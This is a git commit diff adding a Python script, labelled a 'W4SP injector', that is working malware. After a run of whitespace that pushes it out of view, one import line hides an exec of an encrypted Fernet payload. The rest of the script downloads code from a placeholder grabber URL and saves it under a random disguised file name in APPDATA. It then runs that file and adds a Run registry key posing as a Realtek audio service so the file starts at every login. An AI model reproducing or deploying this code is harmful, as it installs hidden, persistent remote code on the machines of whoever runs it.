9fec25b2bc1783d2f9768ec598cf2fac1553507c
User <octo@github.com>
2023-10-15 00:21:12 +0200

    Updated files

---
+++ W4SP-API/scripts/inject.py
@@ -0,0 +1,56 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'xkfiDMPwP3L93uX2Y_61aRw0FFxC8-xdXE6paj3TLkE=').decrypt(b'gAAAAABlKxRMwTP_1m1-u8sRv4z2hMZ3DYn8fOpM_H3bCL6gDLJfwdcwYcM_nhoWb4bgUJCmbYlp3Fibaf43_cU8lnaaLBxaqHwLk78zPeLd3UwDxGxdz3brgRkLZm0OYr-nk2p7s3LWnIg2astBLPPmcn-84B6vMnv-ICvF-SFieMdA328vobkz6joIeuQwwkBB2UCkOmIYi1ufsbCyAYWWl1zpaLCSWg=='))
+from sys import executable
+from urllib import request
+from os import getenv, system, name, listdir
+from os.path import isfile
+import winreg
+from random import choice
+
+if name != 'nt': 
+    exit()
+
+# W4SP injector 1.1
+# by loTus04
+
+def getPath():
+    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
+    directory = listdir(path)
+    for _ in range(10):
+        chosen = choice(directory)
+        ye = path + "\\" + chosen
+        if not isfile(ye) and " " not in chosen:
+            return ye
+    return getenv("TEMP")
+
+def getName():
+    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
+    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
+    return firstName + choice(lasName)
+
+
+def install(path):
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))
+
+def run(path):
+    system(f"start {executable} {path}")
+
+def startUP(path):
+    faked = 'SecurityHealthSystray.exe'
+    address = f"{executable} {path}"
+    key1 = winreg.HKEY_CURRENT_USER
+    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
+
+import contextlib
+DoYouKnowTheWay = getPath() + '\\' + getName()
+install(DoYouKnowTheWay)
+run(DoYouKnowTheWay)
+with contextlib.suppress(Exception):
+    startUP(DoYouKnowTheWay)
